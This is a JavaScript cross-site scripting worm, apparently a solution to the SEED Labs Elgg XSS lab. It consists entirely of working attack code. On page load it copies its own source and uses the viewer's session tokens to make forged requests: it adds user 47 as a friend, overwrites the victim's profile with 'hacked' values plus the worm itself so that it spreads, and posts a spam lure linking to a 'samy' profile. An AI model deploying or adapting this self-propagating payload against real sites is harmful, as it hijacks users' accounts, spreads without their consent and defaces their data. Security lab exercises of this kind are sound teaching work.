<script type="text/javascript" id="worm">
	window.onload = function () {
		//copy the whole code under the worm tag
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		// we need this wormcode to display whenever a profile is loaded

		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
		var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + ts + "&__elgg_token=" + token + "&__elgg_ts=" + ts + "&__elgg_token=" + token; //FILL IN

	
		if(elgg.session.user.guid !== 47){
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send();

		        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
			var token="&__elgg_token="+elgg.security.token.__elgg_token;

	


			var description = "&description=1605038" + wormCode;
			var accessdescription = "&accesslevel[description]=1";

		        var bdescription = "&briefdescription=Hacked";
	 		var accessbdescription = "&accesslevel[briefdescription]=1";

			var contactemail = "&contactemail=hacker@gmail.com";
			var accessemail = "&accesslevel[contactemail]=1";

			var location = "&location=World";
			var accesslocation = "&accesslevel[location]=1";

			var mobile = "&mobile=hacked";
			var accessmobile = "&accesslevel[mobile]=1";

			var phone = "&phone=hacked";
			var accessphone = "&accesslevel[phone]=1";

			var website = "&website=http://www.hacker.com";
			var accesswebsite = "&accesslevel[website]=1";

			var skills = "&skills=hacker";
			var accessskills = "&accesslevel[skills]=1";

			var twitter = "&twitter=hacker";
			var accesstwitter = "&accesslevel[twitter]=1";

			var interests = "&interests=hacking";
			var accessinterests = "&accesslevel[interests]=1";

		       


		        var guid = "&guid=" + elgg.session.user.guid;
		       

		
			var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
			var content= ts + token + description + accessdescription + bdescription + accessbdescription + contactemail + accessemail + location + accesslocation   + mobile  + accessmobile + phone + accessphone + skills + accessskills + website + accesswebsite + twitter + accesstwitter + interests + accessinterests +   guid; //FILL IN
	
			 if(elgg.session.user.guid !== 47)
			{
				//Create and send Ajax request to modify profile
				var Ajax=null;
				Ajax=new XMLHttpRequest();
				Ajax.open("POST",sendurl,true);
				Ajax.setRequestHeader("Host","www.xsslabelgg.com");
				Ajax.setRequestHeader("Content-Type",
				"application/x-www-form-urlencoded");
				Ajax.send(content);

		               	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
			       	var token="&__elgg_token="+elgg.security.token.__elgg_token;

		
				var text = encodeURIComponent("To earn 12 USD/hour (!) visit\n");
		
				var body = "&body=" + text + "http://www.xsslabelgg.com/profile/samy"
		
				var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
				var content= ts + token + body; //FILL IN
	
				if(elgg.session.user.guid !== 47)
				{
					//Create and send Ajax request to modify profile
					var Ajax=null;
					Ajax=new XMLHttpRequest();
					Ajax.open("POST",sendurl,true);
					Ajax.setRequestHeader("Host","www.xsslabelgg.com");
					Ajax.setRequestHeader("Content-Type",
					"application/x-www-form-urlencoded");
					Ajax.send(content);
				}


			}
		        
		        


		}
	}
</script>
